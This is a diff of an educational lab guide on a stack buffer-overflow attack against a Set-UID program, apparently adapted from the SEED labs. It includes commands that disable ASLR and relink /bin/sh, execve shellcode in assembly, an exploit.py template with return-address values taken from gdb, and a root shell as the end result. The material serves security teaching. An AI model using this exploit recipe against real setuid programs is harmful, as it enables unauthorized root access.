@@ -35,11 +35,11 @@ cd
 Files needed for this lab are included in Labsetup.zip, which can be fetched by running the following commands.
 
 
-```
+```bash
 wget https://github.com/CloudLabs-MOC/CloudLabs-SEED/raw/main/Software%20Security/Buffer%20Overflow%20Attack/Buffer%20Overflow%20Setuid/Lab%20files/Labsetup.zip
 ```
 ![image](https://github.com/CloudLabs-MOC/CloudLabs-SEED/assets/33658792/b7f8bc2c-4bf3-46d7-9192-b5c036c5af70)
-```
+```bash
 unzip Labsetup.zip
 ```
 ![image](https://github.com/CloudLabs-MOC/CloudLabs-SEED/assets/33658792/fbe4890d-16ac-4abe-8ef0-deb842d923f4)
@@ -55,7 +55,7 @@ Modern operating systems have implemented several security mechanisms to make th
 
 **Address Space Randomization**. Ubuntu and several other Linux-based systems uses address space randomization to randomize the starting address of heap and stack. This makes guessing the exact addresses difficult; guessing addresses is one of the critical steps of buffer-overflow attacks. This feature can be disabled using the following command: 
 
-```
+```bash
 sudo sysctl -w kernel.randomize_va_space=0
 ```
 ![image](https://github.com/CloudLabs-MOC/CloudLabs-SEED/assets/33658792/facfa7fd-4d17-421f-8bc3-10bbb903b263)
@@ -64,11 +64,11 @@ sudo sysctl -w kernel.randomize_va_space=0
  
 Since our victim program is a Set-UID program, and our attack relies on running `/bin/sh`, the countermeasure in `/bin/dash` makes our attack more difficult. Therefore, we will link `/bin/sh` to another shell that does not have such a countermeasure (in later tasks, we will show that with a little bit more effort, the countermeasure in `/bin/dash` can be easily defeated). We have installed a shell program called `zsh` in our Ubuntu 20.04 VM. The following command can be used to link `/bin/sh` to `zsh`: 
 
-```
+```bash
 sudo ln -sf /bin/zsh /bin/sh
 ```
 or we can type `-v` to see what is happening behind.
-```
+```bash
 sudo ln -sf /bin/zsh /bin/sh -v
 ```
 
@@ -84,7 +84,7 @@ The ultimate goal of buffer-overflow attacks is to inject malicious code into th
 
 First we redirect to the lab files with the help of following commands:
 
-```
+```bash
 ls
 cd Labsetup/
 ls
@@ -96,7 +96,7 @@ ls
 
 A shellcode is basically a piece of code that launches a shell. If we use C code to implement it, it will look like the following: 
 
-```
+```c
 #include <stdio.h>
 
 int main() {
@@ -111,7 +111,7 @@ Unfortunately, we cannot just compile this code and use the binary code as our s
 
 ### 3.2 32-bit Shellcode
 
-```
+```bash
 ; Store the command on stack
 xor eax, eax
 push eax
@@ -140,7 +140,7 @@ The shellcode above basically invokes the execve() system call to execute `/bin/
 
 We provide a sample 64-bit shellcode in the following. It is quite similar to the 32-bit shellcode, except that the names of the registers are different and the registers used by the execve() system call are also different. Some explanation of the code is given in the comment section, and we will not provide detailed explanation on the shellcode 
 
-```
+```bash
 xor rdx, rdx ; rdx = 0: execve()’s 3rd argument
 push rdx
 mov rax, ’/bin//sh’ ; the command we want to run
@@ -160,7 +160,7 @@ We have generated the binary code from the assembly code above, and put the code
 
 Redirect to shellcode and open the **call_shellcode.c**
 
-```
+```bash
 cd shellcode/
 cat call_shellcode.c
 ```
@@ -168,7 +168,7 @@ cat call_shellcode.c
 
 Listing 1 : **callshellcode.c**
 
-```
+```c
 #include <stdlib.h>
 #include <stdio.h>
 #include <string.h>
@@ -204,7 +204,7 @@ The vulnerable program used in this lab is called stack.c, which is in the code 
 
 We have to change the file location since the **stack.c** file is present in "code" folder. To do that type (make sure you are in /Labsetup/shellcode directory):
 
-```
+```bash
 cd ..
 cd code/
 ls
@@ -312,6 +312,7 @@ next
 ```
 p $ebp
 ```
+> Please note down the `$ebp` value ie. 0xffffcfa8 _(This value might change over time)._
 ```
 p &buffer
 quit
@@ -333,7 +334,8 @@ Listing 3: **exploit.py**
 import sys
 
 shellcode= (
-""                                           #Need to change
+    "\x90\x90\x90\x90"  
+    "\x90\x90\x90\x90"
 ).encode(’latin-1’)
 
 # Fill the content with NOP’s
@@ -358,11 +360,25 @@ with open(’badfile’, ’wb’) as f:
 f.write(content)
 ```
 
+Open the file using `nano exploit.py`
+
+Change the following values:
+
+| Param | Value |
+| ----------- | ----------- |
+| start | 400 |
+| ret | 0xffffcfa8 + 100 _(something more than `$ebp` value which you copied in previous task)_ |
+
+> If faced the issue, Please add more in the ret value. Instead of `0xffffcfa8 + 100` try `0xffffcfa8 + 200`.
+
+![image](https://github.com/CloudLabs-MOC/CloudLabs-SEED/assets/33658792/1afabe86-1b6b-44c7-ad44-790a73b11b7c)
+
+
 After you finish the above program, run it. This will generate the contents for _badfile_. Then run the vulnerable program _stack_. If your exploit is implemented correctly, you should be able to get a root shell: 
 
 ```
-$./exploit.py // create the badfile
-$./stack-L1 // launch the attack by running the vulnerable program
+$./exploit.py 
+$./stack-L1 
 # <---- Bingo! You’ve got a root shell!
 ```
 
